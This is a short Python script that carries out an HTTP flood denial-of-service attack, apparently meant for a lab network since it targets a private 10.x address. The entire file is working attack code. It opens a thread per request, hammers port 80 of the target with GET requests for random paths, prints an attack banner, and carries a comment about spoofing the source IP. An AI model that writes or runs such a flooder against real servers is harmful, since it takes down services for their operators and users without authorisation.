

# TO TEST ON THE NODE

import random
import socket
import string
import sys
import threading
import time

# SOURCE_IP = "10.1.5.3" # Change this IP to spoof
TARGET_IP = "10.1.5.2"
port = 80

# Print thread status
def print_status(thread_num, thread_num_mutex):
    thread_num_mutex.acquire(True)

    thread_num += 1
    #print the output on the sameline
    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()


# Generate URL Path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def attack(thread_num, thread_num_mutex):
    print_status(thread_num, thread_num_mutex)
    url_path = generate_url_path()

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos.connect((TARGET_IP, port))

        # Send the request according to HTTP spec
        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {TARGET_IP}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
    finally:
        # Close our socket gracefully
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

def http_flood(SOURCE_IP="10.1.5.3", count=100):
    # Create a shared variable for thread counts
    thread_num = 0
    thread_num_mutex = threading.Lock()
    print (f"[#] Attack started on ({TARGET_IP} ) || Port: {str(port)} || # Requests: {str(count)}")

    # Spawn a thread per request
    all_threads = []
    for _ in range(count):
        t1 = threading.Thread(target=attack, args=(thread_num, thread_num_mutex,))
        t1.start()
        all_threads.append(t1)

        # Adjusting this sleep time will affect requests per second
        time.sleep(0.01)

    for current_thread in all_threads:
        current_thread.join()  # Make the main thread wait for the children threads

http_flood("10.1.5.3", 100)